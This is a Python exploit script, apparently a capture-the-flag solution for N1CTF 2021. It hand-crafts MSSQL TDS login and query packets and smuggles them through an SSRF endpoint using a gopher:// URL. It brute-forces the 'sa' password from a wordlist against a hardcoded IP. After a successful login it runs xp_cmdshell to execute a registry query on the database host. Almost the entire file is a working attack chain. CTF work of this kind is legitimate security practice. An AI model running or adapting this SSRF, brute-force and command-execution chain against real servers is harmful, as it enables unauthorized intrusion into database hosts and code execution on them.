import struct
from pwn import *
import requests


def tds7_enc(password):
    encrypted_pass = ""
    for i in range(len(password)):
        encrypted_pass += chr((((ord(password[i]) << 4) | (ord(password[i]) >> 4)) ^ 0xA5) % 256) + "\xa5"
    return encrypted_pass


def tds_prelogin():
    prelogin_packet = "\x12\x01\x00\x2f\x00\x00\x01\x00\x00\x00\x1a\x00\x06\x01\x00\x20\x00\x01\x02\x00\x21\x00\x01\x03\x00\x22\x00\x04\x04\x00\x26\x00\x01\xff\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00"
    return prelogin_packet


def tds_login(mssql_username, mssql_password, mssql_database):
    login_packet_part1 = \
        "\x10\x01{packet_len}\x00\x00\x01\x00" + \
        "{total_packet_len}\x04\x00\x00\x74" + \
        "\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    login_packet_part2 = \
        "{client_offset}{client_len}" + \
        "{username_offset}{username_len}" + \
        "{password_offset}{password_len}" + \
        "{app_offset}{app_len}" + \
        "{server_offset}{server_len}" + \
        "{unknown_offset}{unknown_len}" + \
        "{library_offset}{library_len}" + \
        "{locale_offset}{locale_len}" + \
        "{database_offset}{database_len}" + \
        "{client_mac}" + \
        "{packet_len}{packet_len}{packet_len}" + \
        "\x00\x00\x00\x00" + \
        "{client_name}{username}{password}{app_name}{server_name}{library_name}{database_name}"

    client_name = "n1ctf".encode("utf-16-le")
    username = mssql_username.encode("utf-16-le")
    password = tds7_enc(mssql_password)
    app_name = "n1ctf".encode("utf-16-le")
    server_name = "localhost".encode("utf-16-le")
    library_name = "n1ctf".encode("utf-16-le")
    database_name = mssql_database.encode("utf-16-le")
    client_mac = "\x00\x00\x00\x00\x00\x00"

    packet_len = 102 + len(client_name) + len(username) + len(password) + len(app_name) + len(server_name) + len(
        library_name) + len(database_name)
    total_packet_len = packet_len - 8
    packed_packet_len = struct.pack(">h", packet_len)
    packed_total_packet_len = struct.pack("<I", total_packet_len)

    client_offset = 94
    packed_client_offset = struct.pack("<h", client_offset)
    client_len = len(client_name)
    packed_client_len = struct.pack("<h", client_len / 2)

    username_offset = client_offset + client_len
    packed_username_offset = struct.pack("<h", username_offset)
    username_len = len(username)
    packed_username_len = struct.pack("<h", username_len / 2)

    password_offset = username_offset + username_len
    packed_password_offset = struct.pack("<h", password_offset)
    password_len = len(password)
    packed_password_len = struct.pack("<h", password_len / 2)

    app_offset = password_offset + password_len
    packed_app_offset = struct.pack("<h", app_offset)
    app_len = len(app_name)
    packed_app_len = struct.pack("<h", app_len / 2)

    server_offset = app_offset + app_len
    packed_server_offset = struct.pack("<h", server_offset)
    server_len = len(server_name)
    packed_server_len = struct.pack("<h", server_len / 2)

    unknown_offset = server_offset + server_len
    packed_unknown_offset = struct.pack("<h", unknown_offset)
    unknown_len = 0
    packed_unknown_len = struct.pack("<h", unknown_len / 2)

    library_offset = unknown_offset
    packed_library_offset = struct.pack("<h", library_offset)
    library_len = len(library_name)
    packed_library_len = struct.pack("<h", library_len / 2)

    locale_offset = library_offset + library_len
    packed_locale_offset = struct.pack("<h", locale_offset)
    locale_len = 0
    packed_locale_len = struct.pack("<h", locale_len / 2)

    database_offset = locale_offset
    packed_database_offset = struct.pack("<h", database_offset)
    database_len = len(database_name)
    packed_database_len = struct.pack("<h", database_len / 2)

    login_packet_part2 = login_packet_part2.format(client_name=client_name, username=username, password=password,
                                                   app_name=app_name, server_name=server_name,
                                                   library_name=library_name,
                                                   database_name=database_name, client_offset=packed_client_offset,
                                                   client_len=packed_client_len, username_offset=packed_username_offset,
                                                   username_len=packed_username_len,
                                                   password_offset=packed_password_offset,
                                                   password_len=packed_password_len, app_offset=packed_app_offset,
                                                   app_len=packed_app_len, server_offset=packed_server_offset,
                                                   server_len=packed_server_len, unknown_offset=packed_unknown_offset,
                                                   unknown_len=packed_unknown_len, library_offset=packed_library_offset,
                                                   library_len=packed_library_len, locale_offset=packed_locale_offset,
                                                   locale_len=packed_locale_len, database_offset=packed_database_offset,
                                                   database_len=packed_database_len, client_mac=client_mac,
                                                   packet_len=packed_total_packet_len
                                                   )

    login_packet_part1 = login_packet_part1.format(packet_len=packed_packet_len,
                                                   total_packet_len=packed_total_packet_len)
    login_packet = login_packet_part1 + login_packet_part2
    return login_packet


def tds_sql_batch(sql):
    sql = sql + ";-- -"
    sql = sql.encode("utf-16-le")
    sql_len = len(sql) + 30 + 2  # gopher protocol will add \x0d\x0a at the end of the request
    sql_batch_packet = "\x01\x01{packed_sql_len}\x00\x00\x01\x00".format(packed_sql_len=struct.pack(">h", sql_len))
    sql_batch_packet += "\x16\x00\x00\x00\x12\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    sql_batch_packet += sql
    return sql_batch_packet


def create_packet(password, sql):
    prelogin_packet = tds_prelogin()
    login_packet = tds_login("sa", password, "master")
    query = tds_sql_batch(sql)
    packet = prelogin_packet + login_packet + query
    return urlencode(packet)

def send(sess, sess_id, password):
    sql = "select 'this_is_test_text';"
    packet = create_packet(password, sql)
    payload = "[e-h]opher://10.11.22.9:1433/_{%s,%s}" % (sess_id, packet)
    data = {"url": payload}
    text = sess.post("http://129.226.12.144/", data=data).content

    if "this_is_test_text" in text:
        print "password: " + password
        sql = "exec master..xp_cmdshell 'cmd /c reg query \"HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021\" /s'"
        packet = create_packet(password, sql)
        payload = "[e-h]opher://10.11.22.9:1433/_{%s,%s}" % (sess_id, packet)
        data = {"url": payload}
        text = sess.post("http://129.226.12.144/", data=data).content
        print text
        exit(0)

if "__main__" == __name__:
    sess = requests.session()
    text = sess.get("http://129.226.12.144/").content
    reg = re.compile("</code>(.*)</br>")
    sess_id = reg.findall(text)[0]

    for password in open("./password.txt"):
        send(sess, sess_id, password.strip())